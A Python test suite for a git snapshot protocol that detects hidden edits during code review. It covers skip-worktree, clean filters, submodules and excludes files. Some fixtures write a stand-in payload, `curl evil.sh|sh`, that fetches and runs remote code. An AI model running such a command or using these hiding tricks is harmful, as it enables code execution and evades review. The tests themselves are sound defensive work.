"""Safety tests for Snapshot Protocol V2.

V3's fingerprint reconstructs the identity of a tree from what `git status`
chooses to report. These tests pin the property that motivated replacing it:
the snapshot must move whenever the bytes a reviewer would read move, with no
dependence on git being willing to mention the path.

Every test builds a throwaway repository under `tmp_path`. None may touch the
real repository, so no helper here takes a root it did not create.

Fixtures write with `write_bytes` and explicit `\n`, never `write_text`: on
Windows `write_text` translates to CRLF, which put CRLF into the index of every
fixture repository and made the eol assertions describe a tree production never
produces. The real repository checks out LF (`.gitattributes` says `eol=lf`),
so LF is what a faithful fixture holds.
"""

import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

import pytest

pytestmark = pytest.mark.slow

AI_DIR = Path(__file__).resolve().parents[1] / "scripts" / "ai"

if str(AI_DIR) not in sys.path:
    sys.path.insert(0, str(AI_DIR))


from snapshot_v2 import (  # noqa: E402
    Snapshot,
    SnapshotError,
    capture,
    ref_name,
    release,
    verify,
)


RUN_ID = "11111111-1111-4111-8111-111111111111"


# --- helpers -----------------------------------------------------------------


def _run(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args], cwd=root, capture_output=True, text=True, check=False
    )


def _git(root: Path, *args: str) -> str:
    result = _run(root, *args)

    if result.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {result.stderr}")

    return result.stdout


def _repo(tmp_path: Path) -> Path:
    """A repository with one commit and one tracked file."""
    root = tmp_path / "repo"
    root.mkdir()

    for args in (
        ("init", "-q"),
        ("config", "user.email", "t@example.com"),
        ("config", "user.name", "t"),
        ("config", "core.autocrlf", "false"),
        # Igual que `core.autocrlf`: se fija para que el repo de prueba se
        # comporte igual en todas las plataformas. Sin esto, en Linux
        # (`core.fileMode=true` por defecto) git deduce el modo del fichero EN
        # DISCO y pisa el que se puso en el indice con `update-index --chmod=+x`,
        # asi que el modo staged salia 100644 y dos tests fallaban SOLO en el
        # CI. En Windows el defecto ya es `false`, que es exactamente por lo que
        # en local nunca se vio. Lo que esos tests miden es que el modo del
        # INDICE sobrevive, no el permiso del sistema de ficheros.
        ("config", "core.fileMode", "false"),
    ):
        _git(root, *args)

    (root / "money.py").write_bytes("BALANCE = 1000\n".encode())
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "base")

    return root


def _tree(root: Path, tree: str) -> dict[str, tuple[str, str]]:
    """`{path: (mode, oid)}` for every blob in `tree`, recursively."""
    entries: dict[str, tuple[str, str]] = {}

    for line in _git(root, "ls-tree", "-r", "-z", tree).split("\0"):
        if not line:
            continue

        meta, _, path = line.partition("\t")
        mode, _, rest = meta.partition(" ")
        _, _, oid = rest.partition(" ")
        entries[path] = (mode, oid)

    return entries


def _blob(root: Path, oid: str) -> str:
    return _git(root, "cat-file", "-p", oid)


def _blob_bytes(root: Path, oid: str) -> bytes:
    """The blob byte for byte.

    `_blob` goes through `text=True`, and universal-newline decoding rewrites
    CRLF to LF on the way out -- so an assertion about line endings made with it
    is unfalsifiable. Any test about raw bytes must use this.
    """
    result = subprocess.run(
        ["git", "cat-file", "-p", oid], cwd=root, capture_output=True, check=True
    )

    return result.stdout


def _index_bytes(root: Path) -> bytes:
    return (root / ".git" / "index").read_bytes()


def _refs(root: Path) -> str:
    return _git(root, "for-each-ref", "--format=%(refname)")


# --- the four fields ---------------------------------------------------------


def test_capture_returns_the_four_approved_fields(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    snapshot = capture(root, RUN_ID)

    assert isinstance(snapshot, Snapshot)

    for value in (
        snapshot.base_commit,
        snapshot.staged_tree,
        snapshot.review_tree,
        snapshot.review_commit,
    ):
        assert len(value) == 40 and all(c in "0123456789abcdef" for c in value)


def test_review_commit_points_at_review_tree_and_parents_base_commit(
    tmp_path: Path,
) -> None:
    root = _repo(tmp_path)

    snapshot = capture(root, RUN_ID)
    body = _blob(root, snapshot.review_commit)

    assert f"tree {snapshot.review_tree}" in body
    assert f"parent {snapshot.base_commit}" in body


def test_base_commit_is_head(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    assert capture(root, RUN_ID).base_commit == _git(
        root, "rev-parse", "HEAD"
    ).strip()


def test_capture_of_an_unchanged_tree_is_deterministic(tmp_path: Path) -> None:
    """Same state, same run: the same four values, including the commit."""
    root = _repo(tmp_path)

    assert capture(root, RUN_ID) == capture(root, RUN_ID)


# --- what the review tree must contain ---------------------------------------


def test_review_tree_carries_unstaged_working_tree_content(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    (root / "money.py").write_bytes("BALANCE = 2\n".encode())

    snapshot = capture(root, RUN_ID)

    assert _blob(root, _tree(root, snapshot.review_tree)["money.py"][1]) == (
        "BALANCE = 2\n"
    )


def test_review_tree_carries_untracked_files(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    (root / "new.py").write_bytes("NEW = 1\n".encode())

    assert "new.py" in _tree(root, capture(root, RUN_ID).review_tree)


def test_review_tree_drops_deleted_files(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    (root / "money.py").unlink()

    assert "money.py" not in _tree(root, capture(root, RUN_ID).review_tree)


def test_staged_tree_is_the_index_not_the_working_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    (root / "money.py").write_bytes("STAGED = 1\n".encode())
    _git(root, "add", "money.py")
    (root / "money.py").write_bytes("ON_DISK = 1\n".encode())

    snapshot = capture(root, RUN_ID)

    assert _blob(root, _tree(root, snapshot.staged_tree)["money.py"][1]) == (
        "STAGED = 1\n"
    )
    assert _blob(root, _tree(root, snapshot.review_tree)["money.py"][1]) == (
        "ON_DISK = 1\n"
    )


def test_staged_mode_survives_into_both_trees(tmp_path: Path) -> None:
    """The index mode is part of what is staged (obs: read-tree loses it)."""
    root = _repo(tmp_path)
    _git(root, "update-index", "--chmod=+x", "money.py")

    snapshot = capture(root, RUN_ID)

    assert _tree(root, snapshot.staged_tree)["money.py"][0] == "100755"
    assert _tree(root, snapshot.review_tree)["money.py"][0] == "100755"


# --- CLA-V4-02: the flags git honours and the fingerprint could not see -------


def test_skip_worktree_rewrite_moves_the_review_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    before = capture(root, RUN_ID)

    _git(root, "update-index", "--skip-worktree", "money.py")
    (root / "money.py").write_bytes("EVIL = 1\n".encode())

    after = capture(root, RUN_ID)

    assert _git(root, "status", "--porcelain").strip() == ""
    assert after.review_tree != before.review_tree
    assert _blob(root, _tree(root, after.review_tree)["money.py"][1]) == "EVIL = 1\n"


def test_skip_worktree_deletion_moves_the_review_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    before = capture(root, RUN_ID)

    _git(root, "update-index", "--skip-worktree", "money.py")
    (root / "money.py").unlink()

    after = capture(root, RUN_ID)

    assert after.review_tree != before.review_tree
    assert "money.py" not in _tree(root, after.review_tree)


def test_assume_unchanged_rewrite_moves_the_review_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    before = capture(root, RUN_ID)

    _git(root, "update-index", "--assume-unchanged", "money.py")
    (root / "money.py").write_bytes("EVIL = 2\n".encode())

    after = capture(root, RUN_ID)

    assert after.review_tree != before.review_tree
    assert _blob(root, _tree(root, after.review_tree)["money.py"][1]) == "EVIL = 2\n"


def test_capture_does_not_clear_the_flags_on_the_real_index(tmp_path: Path) -> None:
    """Clearing the bits is how the snapshot sees the bytes; the developer's
    own index must come back exactly as it was."""
    root = _repo(tmp_path)
    _git(root, "update-index", "--skip-worktree", "money.py")
    before = _index_bytes(root)

    capture(root, RUN_ID)

    assert _index_bytes(root) == before
    assert _git(root, "ls-files", "-v", "money.py").startswith("S ")


# --- CLA-V4-01: the gitlink shapes that collided under the fingerprint -------


def _with_submodule(tmp_path: Path) -> Path:
    inner = tmp_path / "inner"
    inner.mkdir()

    for args in (
        ("init", "-q"),
        ("config", "user.email", "t@example.com"),
        ("config", "user.name", "t"),
    ):
        _git(inner, *args)

    (inner / "z.py").write_bytes("ORIGINAL = 1\n".encode())
    _git(inner, "add", "-A")
    _git(inner, "commit", "-qm", "inner")

    root = _repo(tmp_path)
    _git(root, "-c", "protocol.file.allow=always", "submodule", "add", "-q",
         inner.as_uri(), "sub")
    _git(root, "commit", "-qm", "add submodule")

    return root


def _rmtree(path: Path) -> None:
    """`shutil.rmtree` that survives git's read-only object files on Windows.

    With `ignore_errors=True` those files simply stay, which silently leaves a
    stale submodule behind and makes every shape after it a lie.
    """

    def _clear_readonly(func: object, target: str, _exc: BaseException) -> None:
        os.chmod(target, stat.S_IWRITE)
        func(target)  # type: ignore[operator]

    if path.exists():
        # `onexc` es de Python 3.12; `pyproject` admite >=3.11 y el CI corre la
        # pata 3.11, donde esto reventaba con TypeError -- no fallo del codigo
        # bajo prueba, sino del andamio. `onerror` sigue existiendo en 3.12+
        # (deprecado) pero usarlo alli emitiria DeprecationWarning, asi que se
        # elige por version en vez de por try/except.
        if sys.version_info >= (3, 12):
            shutil.rmtree(path, onexc=_clear_readonly)
        else:
            shutil.rmtree(path, onerror=lambda f, t, e: _clear_readonly(f, t, e))

    assert not path.exists()


def _gitlink_shapes(root: Path) -> dict[str, str]:
    """One `review_tree` per shape a gitlink path can take on disk.

    Every shape is produced by mutating **one** repository in place, so the
    outer HEAD and the outer index are constant by construction and the only
    variable is the directory at `sub`. Building a repository per shape was the
    confound that invalidated an earlier probe of this same defect.
    """
    sub = root / "sub"
    trees: dict[str, str] = {}
    pristine = _git(sub, "rev-parse", "HEAD").strip()

    def record(name: str) -> None:
        trees[name] = capture(root, RUN_ID).review_tree

    def reset() -> None:
        """Back to the pristine submodule, HEAD included.

        `reset --hard` and not a copy of the directory: a submodule's git data
        lives in the superproject's `.git/modules/`, so restoring only the
        working copy leaves HEAD wherever the last shape moved it -- which
        silently turned `live_dirty` into a duplicate of `live_new_commit`.
        """
        _git(sub, "reset", "--hard", "-q", pristine)

    reset()
    record("live_clean")

    # Same bytes as `live_dirty` below, but committed: the identity has to
    # carry the submodule's HEAD, not only its working tree.
    (sub / "z.py").write_bytes("MOVED = 1\n".encode())
    _git(sub, "commit", "-qam", "inner move")
    record("live_new_commit")

    # Same HEAD as `live_clean`, different bytes: the identity has to carry the
    # submodule's working tree, not only its HEAD.
    reset()
    (sub / "z.py").write_bytes("MOVED = 1\n".encode())
    record("live_dirty")

    reset()
    (sub / "payload.py").write_bytes("import os\n".encode())
    record("live_untracked")

    _rmtree(sub)
    sub.mkdir()
    record("empty_dir")

    # Three plain directories: an opaque "not a repository" value would
    # collapse all three, so the identity has to carry their content.
    (sub / "z.py").write_bytes("PLAIN_A = 1\n".encode())
    record("plain_a")

    (sub / "z.py").write_bytes("PLAIN_B = 1\n".encode())
    record("plain_b")

    (sub / "payload.py").write_bytes("import os\n".encode())
    record("plain_b_extra")

    _rmtree(sub)
    record("absent")

    sub.write_bytes("NOT_A_DIRECTORY = 1\n".encode())
    record("regular_file")

    return trees


def test_every_gitlink_shape_gets_its_own_review_tree(tmp_path: Path) -> None:
    """The invariant CLA-V4-01 was opened against.

    A reviewer reading the working tree can tell all ten of these apart. The
    snapshot must too: no two of them may share a `review_tree`. This is the
    general property, not a carve-out for the three shapes that were reported
    -- `plain_a`/`plain_b` differ only in the bytes of one file, and
    `live_new_commit`/`live_dirty` differ only in whether those bytes were
    committed.
    """
    root = _with_submodule(tmp_path)

    trees = _gitlink_shapes(root)

    collisions = {
        tree: sorted(name for name, value in trees.items() if value == tree)
        for tree in set(trees.values())
    }

    assert all(len(names) == 1 for names in collisions.values()), (
        "shapes sharing one review_tree: "
        f"{[names for names in collisions.values() if len(names) > 1]}"
    )


def test_gitlink_shapes_are_stable_across_recapture(tmp_path: Path) -> None:
    """Distinctness is worthless if the value also moves on its own: whatever
    the identity of a gitlink directory is, recapturing an untouched one must
    reproduce it."""
    root = _with_submodule(tmp_path)
    sub = root / "sub"

    (sub / "payload.py").write_bytes("import os\n".encode())

    assert capture(root, RUN_ID) == capture(root, RUN_ID)


def test_verify_rejects_tampering_inside_a_submodule(tmp_path: Path) -> None:
    """The gate, not just the digest: a swap under a gitlink must break the
    round the same way a swap anywhere else does."""
    root = _with_submodule(tmp_path)
    snapshot = capture(root, RUN_ID)

    _rmtree(root / "sub")
    (root / "sub").mkdir()
    (root / "sub" / "payload.py").write_bytes("import os\n".encode())

    matched, detail = verify(root, snapshot)

    assert not matched
    assert "review_tree" in detail


# --- raw bytes: nothing may stand between the disk and the tree --------------


def _production_repo(tmp_path: Path) -> Path:
    """A repository configured the way the real one is.

    The earlier fixture pinned `core.autocrlf=false` and wrote no
    `.gitattributes`, which is not merely weaker than production -- it is its
    inverse, and it is why the normalization hole survived a green suite.
    """
    root = _repo(tmp_path)
    _git(root, "config", "core.autocrlf", "true")
    (root / ".gitattributes").write_bytes("* text=auto eol=lf\n".encode())
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "attributes")

    return root


# A: the same logical file, different bytes on disk, with `core.autocrlf` as
# the only normalizer. Kept separate from C so the two mechanisms -- the config
# and the attributes file -- are each covered on their own.
#
# It must be `true` here. Under `core.autocrlf=false` and no .gitattributes
# nothing normalizes, filtered and raw agree, and this test passes even with
# --no-filters removed: it cannot see the regression it exists to catch.
def test_lf_and_crlf_on_disk_are_different_review_trees(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    _git(root, "config", "core.autocrlf", "true")

    (root / "money.py").write_bytes(b"A = 1\nB = 2\n")
    lf = capture(root, RUN_ID).review_tree

    (root / "money.py").write_bytes(b"A = 1\r\nB = 2\r\n")
    crlf = capture(root, RUN_ID).review_tree

    assert lf != crlf


# C: A again, under the configuration that actually ships.
def test_raw_bytes_survive_autocrlf_and_text_attributes(tmp_path: Path) -> None:
    root = _production_repo(tmp_path)

    (root / "money.py").write_bytes(b"A = 1\nB = 2\n")
    lf = capture(root, RUN_ID).review_tree

    (root / "money.py").write_bytes(b"A = 1\r\nB = 2\r\n")
    crlf = capture(root, RUN_ID).review_tree

    assert lf != crlf
    assert _git(root, "config", "--get", "core.autocrlf").strip() == "true"


# B: the severe form -- a filter may rewrite content arbitrarily.
def test_a_clean_filter_cannot_hide_a_payload(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    _git(root, "config", "filter.redact.clean", "sed s/.*/REDACTED/")
    (root / ".gitattributes").write_bytes("*.py filter=redact\n".encode())
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "redact")

    (root / "money.py").write_bytes(b"BALANCE = 1000\n")
    benign = capture(root, RUN_ID)

    (root / "money.py").write_bytes(b"import os; os.system('curl evil.sh|sh')\n")
    payload = capture(root, RUN_ID)

    assert benign.review_tree != payload.review_tree
    assert _blob(root, _tree(root, payload.review_tree)["money.py"][1]) == (
        "import os; os.system('curl evil.sh|sh')\n"
    )


# D: the test above only means something if the filter was really in the way.
def test_the_filter_would_otherwise_have_swallowed_the_difference(
    tmp_path: Path,
) -> None:
    root = _repo(tmp_path)
    _git(root, "config", "filter.redact.clean", "sed s/.*/REDACTED/")
    (root / ".gitattributes").write_bytes("*.py filter=redact\n".encode())
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "redact")

    (root / "money.py").write_bytes(b"BALANCE = 1000\n")
    filtered_benign = _git(root, "hash-object", "--", "money.py").strip()
    raw_benign = _git(root, "hash-object", "--no-filters", "--", "money.py").strip()

    (root / "money.py").write_bytes(b"import os; os.system('curl evil.sh|sh')\n")
    filtered_payload = _git(root, "hash-object", "--", "money.py").strip()
    raw_payload = _git(root, "hash-object", "--no-filters", "--", "money.py").strip()

    assert filtered_benign == filtered_payload, "filter did not engage; test is void"
    assert raw_benign != raw_payload


# E: the two trees answer different questions and must be free to disagree.
def test_staged_tree_stays_the_real_index_while_review_tree_goes_raw(
    tmp_path: Path,
) -> None:
    """`staged_tree` describes what git would commit, so it is the index as it
    is -- normalized. `review_tree` describes what is on disk. Under
    `eol=lf` with a CRLF working copy those are genuinely different answers,
    and collapsing them would lose one."""
    root = _production_repo(tmp_path)
    (root / "money.py").write_bytes(b"A = 1\r\nB = 2\r\n")
    _git(root, "add", "money.py")

    snapshot = capture(root, RUN_ID)

    staged = _blob_bytes(root, _tree(root, snapshot.staged_tree)["money.py"][1])
    review = _blob_bytes(root, _tree(root, snapshot.review_tree)["money.py"][1])

    assert staged == b"A = 1\nB = 2\n"
    assert review == b"A = 1\r\nB = 2\r\n"
    assert snapshot.staged_tree != snapshot.review_tree


# F: the raw rehash touches the disk more than before; it must still not write.
def test_raw_capture_leaves_the_repository_untouched(tmp_path: Path) -> None:
    root = _production_repo(tmp_path)
    (root / "money.py").write_bytes(b"DIRTY = 1\r\n")
    (root / "untracked.py").write_bytes(b"U = 1\r\n")

    head = _git(root, "rev-parse", "HEAD")
    index = _index_bytes(root)
    branches = _git(root, "for-each-ref", "--format=%(refname)", "refs/heads/")
    on_disk = (root / "money.py").read_bytes()

    capture(root, RUN_ID)

    assert _git(root, "rev-parse", "HEAD") == head
    assert _index_bytes(root) == index
    assert _git(root, "for-each-ref", "--format=%(refname)", "refs/heads/") == branches
    assert (root / "money.py").read_bytes() == on_disk


def test_raw_bytes_do_not_disturb_the_mode(tmp_path: Path) -> None:
    root = _production_repo(tmp_path)
    _git(root, "update-index", "--chmod=+x", "money.py")

    assert _tree(root, capture(root, RUN_ID).review_tree)["money.py"][0] == "100755"


# --- exclusions --------------------------------------------------------------


def test_this_systems_own_artefacts_stay_out_of_both_trees(tmp_path: Path) -> None:
    """Not via .gitignore: the repository here has none, and editing one in the
    real repository must not be able to smuggle them in either."""
    root = _repo(tmp_path)
    runtime = root / ".claude" / "reviews" / "runtime"
    runtime.mkdir(parents=True)
    (runtime / "claude.json").write_bytes("{}\n".encode())
    (root / ".codex-tmp").mkdir()
    (root / ".codex-tmp" / "scratch").write_bytes("x\n".encode())

    snapshot = capture(root, RUN_ID)
    paths = set(_tree(root, snapshot.review_tree)) | set(
        _tree(root, snapshot.staged_tree)
    )

    assert not any(
        path.startswith((".claude/reviews/runtime/", ".codex-tmp/")) for path in paths
    )


def test_writing_a_review_artefact_does_not_move_the_snapshot(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    before = capture(root, RUN_ID)

    runtime = root / ".claude" / "reviews" / "runtime"
    runtime.mkdir(parents=True)
    (runtime / "codex.json").write_bytes(b'{"verdict": "CLEAN"}\n')

    assert capture(root, RUN_ID) == before


def test_ignored_files_stay_out_of_the_review_tree(tmp_path: Path) -> None:
    """A documented boundary, asserted so it cannot change silently."""
    root = _repo(tmp_path)
    (root / ".gitignore").write_bytes("secret.txt\n".encode())
    (root / "secret.txt").write_bytes("s\n".encode())

    paths = _tree(root, capture(root, RUN_ID).review_tree)

    assert ".gitignore" in paths
    assert "secret.txt" not in paths


# --- CLA-V8-02: ignore sources that live in no tree --------------------------
#
# `.gitignore` above may shape the tree because it is itself in the tree, so
# editing it moves the digest. `core.excludesFile` and `$GIT_DIR/info/exclude`
# are not, so a path named there leaves `review_tree` with nothing moving and
# can be edited mid-round undetected. The first is overridden; the second has no
# switch and is a documented limit, pinned in tests/test_cross_review_e2e_v2.py.


def test_a_global_excludes_file_cannot_shape_the_review_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    (root / "extra.py").write_bytes(b"SECRET = 1\n")

    ignore = tmp_path / "globalignore"
    ignore.write_bytes(b"extra.py\n")
    _git(root, "config", "core.excludesFile", str(ignore))

    assert "extra.py" in _tree(root, capture(root, RUN_ID).review_tree)


def test_a_global_excludes_file_cannot_hide_content_under_a_replaced_gitlink(
    tmp_path: Path,
) -> None:
    """F-1: the override reached one of the two `git add` calls, not both.

    A gitlink replaced by an ordinary directory is re-added by
    `_replace_with_directory_content`, which runs its own `add`. While that one
    still honoured the global ignore, a file inside the substituted directory
    could be named there, leave `review_tree`, and then be rewritten with the
    digest unmoved -- the exact hole the override exists to close, reachable by
    a different route.
    """
    root = _with_submodule(tmp_path)

    _rmtree(root / "sub")
    (root / "sub").mkdir()
    (root / "sub" / "payload.py").write_bytes(b"ORIGINAL = 1\n")

    ignore = tmp_path / "globalignore"
    ignore.write_bytes(b"payload.py\n")
    _git(root, "config", "core.excludesFile", str(ignore))

    before = capture(root, RUN_ID).review_tree

    (root / "sub" / "payload.py").write_bytes(b"PWNED = 1\n")

    assert capture(root, RUN_ID).review_tree != before, (
        "a file under a replaced gitlink stayed hidden by core.excludesFile"
    )


def test_a_self_ignoring_gitignore_is_still_able_to_hide_content(
    tmp_path: Path,
) -> None:
    """A documented limit, pinned rather than endorsed.

    `.gitignore` is normally safe because it is itself in the tree, so editing
    it moves the digest. A `.gitignore` that its own patterns match is not in
    the tree, so it and everything it hides can be edited mid-round with nothing
    moving. `.mypy_cache/.gitignore` and friends are exactly this shape.

    Recorded in the "Scope of the guarantee" section of
    `.claude/reviews/CROSS_REVIEW.md`. If this starts failing, the limit has
    closed and that section should be updated to match.
    """
    root = _repo(tmp_path)
    cache = root / "cache"
    cache.mkdir()
    (cache / ".gitignore").write_bytes(b"*\n")
    (cache / "payload.py").write_bytes(b"ORIGINAL = 1\n")

    paths = _tree(root, capture(root, RUN_ID).review_tree)

    assert "cache/.gitignore" not in paths

    before = capture(root, RUN_ID).review_tree
    (cache / "payload.py").write_bytes(b"PWNED = 1\n")

    assert capture(root, RUN_ID).review_tree == before, (
        "a self-ignoring .gitignore no longer hides content: update the docs"
    )


# --- the ref -----------------------------------------------------------------


def test_capture_publishes_the_run_ref_at_the_review_commit(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    snapshot = capture(root, RUN_ID)

    assert _git(root, "rev-parse", ref_name(RUN_ID)).strip() == snapshot.review_commit


def test_release_removes_the_run_ref(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    capture(root, RUN_ID)

    release(root, RUN_ID)

    assert ref_name(RUN_ID) not in _refs(root)


def test_release_is_idempotent(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    release(root, RUN_ID)
    release(root, RUN_ID)


def test_the_ref_keeps_the_review_commit_alive_through_gc(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    snapshot = capture(root, RUN_ID)
    _git(root, "reflog", "expire", "--expire=now", "--all")
    _git(root, "gc", "--prune=now", "-q")

    assert _run(root, "cat-file", "-e", snapshot.review_commit).returncode == 0


# --- the repository must come back untouched ---------------------------------


def test_capture_leaves_head_the_index_and_the_branches_untouched(
    tmp_path: Path,
) -> None:
    root = _repo(tmp_path)
    (root / "money.py").write_bytes("DIRTY = 1\n".encode())
    (root / "untracked.py").write_bytes("U = 1\n".encode())

    head = _git(root, "rev-parse", "HEAD")
    index = _index_bytes(root)
    status = _git(root, "status", "--porcelain", "--untracked-files=all")
    branches = _git(root, "for-each-ref", "--format=%(refname)", "refs/heads/")

    capture(root, RUN_ID)

    assert _git(root, "rev-parse", "HEAD") == head
    assert _index_bytes(root) == index
    assert _git(root, "status", "--porcelain", "--untracked-files=all") == status
    assert _git(root, "for-each-ref", "--format=%(refname)", "refs/heads/") == branches


def test_capture_creates_no_ref_outside_its_own_namespace(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    before = set(_refs(root).split())

    capture(root, RUN_ID)

    assert set(_refs(root).split()) - before == {ref_name(RUN_ID)}


# --- verification ------------------------------------------------------------


def test_verify_accepts_an_unchanged_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    assert verify(root, capture(root, RUN_ID))[0]


def test_verify_rejects_a_working_tree_edit(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    snapshot = capture(root, RUN_ID)

    (root / "money.py").write_bytes("CHANGED = 1\n".encode())

    matched, detail = verify(root, snapshot)

    assert not matched
    assert "review_tree" in detail


def test_verify_rejects_a_skip_worktree_edit(tmp_path: Path) -> None:
    """The defect CLA-V4-02 was opened for, at the gate that consumed it."""
    root = _repo(tmp_path)
    snapshot = capture(root, RUN_ID)

    _git(root, "update-index", "--skip-worktree", "money.py")
    (root / "money.py").write_bytes("EVIL = 3\n".encode())

    assert not verify(root, snapshot)[0]


def test_verify_rejects_a_new_commit(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    snapshot = capture(root, RUN_ID)

    (root / "money.py").write_bytes("MORE = 1\n".encode())
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "second")

    matched, detail = verify(root, snapshot)

    assert not matched
    assert "base_commit" in detail


def test_verify_rejects_a_staged_only_change(tmp_path: Path) -> None:
    """`git diff` is the working tree against the index, so the diff a reviewer
    reads moves when the index moves even if the bytes on disk do not."""
    root = _repo(tmp_path)
    (root / "money.py").write_bytes("SAME = 1\n".encode())
    snapshot = capture(root, RUN_ID)

    _git(root, "add", "money.py")

    matched, detail = verify(root, snapshot)

    assert not matched
    assert "staged_tree" in detail


# --- states a snapshot cannot be taken of ------------------------------------


def test_a_conflicted_index_is_refused(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    _git(root, "checkout", "-qb", "other")
    (root / "money.py").write_bytes("THEIRS = 1\n".encode())
    _git(root, "commit", "-qam", "theirs")
    _git(root, "checkout", "-q", "-")
    (root / "money.py").write_bytes("OURS = 1\n".encode())
    _git(root, "commit", "-qam", "ours")
    assert _run(root, "merge", "other").returncode != 0

    with pytest.raises(SnapshotError, match="unmerged"):
        capture(root, RUN_ID)


def test_an_unborn_head_is_refused(tmp_path: Path) -> None:
    root = tmp_path / "empty"
    root.mkdir()
    _git(root, "init", "-q")

    with pytest.raises(SnapshotError, match="HEAD"):
        capture(root, RUN_ID)


def test_a_directory_that_is_not_a_repository_is_refused(tmp_path: Path) -> None:
    plain = tmp_path / "plain"
    plain.mkdir()

    with pytest.raises(SnapshotError):
        capture(plain, RUN_ID)


# --- the temporary index is scratch, and it is cleaned up --------------------


def test_capture_leaves_no_temporary_index_behind(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    before = sorted(p.name for p in (root / ".git").iterdir())

    capture(root, RUN_ID)

    assert sorted(p.name for p in (root / ".git").iterdir()) == before


def test_capture_does_not_write_into_the_working_tree(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    (root / "untracked.py").write_bytes("U = 1\n".encode())
    before = {
        str(p.relative_to(root)): p.read_bytes()
        for p in root.rglob("*")
        if p.is_file() and ".git" not in p.parts
    }

    capture(root, RUN_ID)

    after = {
        str(p.relative_to(root)): p.read_bytes()
        for p in root.rglob("*")
        if p.is_file() and ".git" not in p.parts
    }

    assert after == before
